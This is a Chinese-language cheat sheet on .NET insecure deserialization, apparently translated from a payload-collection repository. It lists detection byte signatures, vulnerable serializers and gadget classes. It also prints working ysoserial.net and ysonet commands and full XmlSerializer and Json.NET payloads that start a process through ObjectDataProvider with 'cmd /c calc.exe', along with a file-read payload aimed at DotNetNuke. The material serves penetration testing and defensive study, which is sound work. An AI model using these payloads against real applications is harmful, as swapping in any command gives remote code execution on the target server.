[原文文档](DotNET.en.md)

# .NET 反序列化

> .NET 序列化是将对象状态转换为可以轻松存储或传输的格式（如 XML、JSON 或二进制）的过程。然后，这个序列化的数据可以保存到文件、通过网络发送或存储在数据库中。稍后，它可以被反序列化以重建原始对象并保持其数据完整。序列化在 .NET 中广泛用于缓存、应用程序之间的数据传输和会话状态管理等任务。

## 摘要

* [检测](#检测)
* [工具](#工具)
* [格式化器](#格式化器)
    * [XmlSerializer](#xmlserializer)
    * [DataContractSerializer](#datacontractserializer)
    * [NetDataContractSerializer](#netdatacontractserializer)
    * [LosFormatter](#losformatter)
    * [JSON.NET](#jsonnet)
    * [BinaryFormatter](#binaryformatter)
* [POP 小工具](#pop-小工具)
* [参考资料](#参考资料)

## 检测

| 数据           | 描述         |
| -------------- | ------------------- |
| `AAEAAD` (十六进制) | .NET BinaryFormatter |
| `FF01` (十六进制)   | .NET ViewState |
| `/w` (Base64)   | .NET ViewState |

示例: `AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`

## 工具

* [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) - 适用于各种 .NET 格式化器的反序列化有效载荷生成器

    ```ps1
    cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
    ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
    ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
    ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
    ```

* [irsdl/ysonet](https://github.com/irsdl/ysonet) - 适用于各种 .NET 格式化器的反序列化有效载荷生成器

    ```ps1
    cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s
    ./ysonet.exe -p DotNetNuke -m read_file -f win.ini
    ./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
    ./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
    ```

## 格式化器

![NETNativeFormatters.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Insecure%20Deserialization/Images/NETNativeFormatters.png?raw=true)
来自 [pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15) 的 .NET 原生格式化器

### XmlSerializer

* 在 C# 源代码中，查找 `XmlSerializer(typeof(<TYPE>));`。
* 攻击者必须控制 XmlSerializer 的**类型**。
* 有效载荷输出: **XML**

```xml
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

### DataContractSerializer

> DataContractSerializer 以松耦合的方式进行反序列化。它从不从传入数据中读取公共语言运行时 (CLR) 类型和程序集名称。XmlSerializer 的安全模型与 DataContractSerializer 类似，主要在细节上有所不同。例如，XmlIncludeAttribute 属性用于类型包含，而不是 KnownTypeAttribute 属性。

* 在 C# 源代码中，查找 `DataContractSerializer(typeof(<TYPE>))`。
* 有效载荷输出: **XML**
* 数据**类型**必须是用户可控的才能被利用

### NetDataContractSerializer

> 它扩展了 `System.Runtime.Serialization.XmlObjectSerializer` 类，并且能够像 `BinaryFormatter` 一样序列化带有可序列化属性的任何类型。

* 在 C# 源代码中，查找 `NetDataContractSerializer().ReadObject()`。
* 有效载荷输出: **XML**

```ps1
.\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### LosFormatter

* 内部使用 `BinaryFormatter`。

```ps1
.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### JSON.NET

* 在 C# 源代码中，查找 `JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings`。
* 有效载荷输出: **JSON**

```ps1
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### BinaryFormatter

> BinaryFormatter 类型是危险的，不建议用于数据处理。应用程序应尽快停止使用 BinaryFormatter，即使它们认为正在处理的数据是可信的。BinaryFormatter 不安全，也无法使其安全。

* 在 C# 源代码中，查找 `System.Runtime.Serialization.Binary.BinaryFormatter`。
* 利用需要 `[Serializable]` 或 `ISerializable` 接口。
* 有效载荷输出: **二进制**

```ps1
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## POP 小工具

这些小工具必须具有以下属性：

* 可序列化
* 公共/可设置变量
* 魔法"函数"：Get/Set、序列化、构造函数/析构函数

您必须仔细选择针对**格式化器**的**小工具**。

常用有效载荷中使用的流行小工具列表。

* **ObjectDataProvider** 来自 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll`
    * 使用 `MethodParameters` 设置任意参数
    * 使用 `MethodName` 调用任意函数
* **ExpandedWrapper**
    * 指定被封装对象的`对象类型`

    ```cs
    ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
    ```

* **System.Configuration.Install.AssemblyInstaller**
    * 使用 Assembly.Load 执行有效载荷

    ```cs
    // System.Configuration.Install.AssemblyInstaller
    public void set_Path(string value){
        if (value == null){
            this.assembly = null;
        }
        this.assembly = Assembly.LoadFrom(value);
    }
    ```

## 参考资料

* [你是我的类型吗？通过序列化突破 .NET 沙箱 - 幻灯片 - James Forshaw - 2012 年 9 月 20 日](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
* [你是我的类型吗？通过序列化突破 .NET 沙箱 - 白皮书 - James Forshaw - 2012 年 9 月 20 日](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
* [攻击 .NET 反序列化 - Alvaro Muñoz - 2018 年 4 月 28 日](https://youtu.be/eDfGpu3iE4Q)
* [攻击 .NET 序列化 - Alvaro - 2017 年 10 月 20 日](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=11)
* [基本的 .Net 反序列化（ObjectDataProvider 小工具、ExpandedWrapper 和 Json.Net）- HackTricks - 2024 年 7 月 18 日](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net)
* [绕过 .NET 序列化绑定器 - Markus Wulftange - 2022 年 6 月 28 日](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
* [通过 ViewState 利用 ASP.NET 中的反序列化 - Soroush Dalili (@irsdl) - 2019 年 4 月 23 日](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [为 DataContractSerializer 寻找新的 RCE 小工具链 - dugisec - 2019 年 11 月 7 日](https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/)
* [星期五 13 日：JSON 攻击 - DEF CON 25 会议 - Alvaro Muñoz (@pwntester) 和 Oleksandr Mirosh - 2017 年 7 月 22 日](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
* [星期五 13 日：JSON 攻击 - 幻灯片 - Alvaro Muñoz (@pwntester) 和 Oleksandr Mirosh - 2017 年 7 月 22 日](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [星期五 13 日：JSON 攻击 - 白皮书 - Alvaro Muñoz (@pwntester) 和 Oleksandr Mirosh - 2017 年 7 月 22 日](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
* [现在你序列化，现在你不序列化 - 系统地寻找反序列化利用 - Alyssa Rahman - 2021 年 12 月 13 日](https://www.mandiant.com/resources/blog/hunting-deserialization-exploits)
* [Sitecore Experience Platform 预认证 RCE - CVE-2021-42237 - Shubham Shah - 2021 年 11 月 2 日](https://blog.assetnote.io/2021/11/02/sitecore-rce/)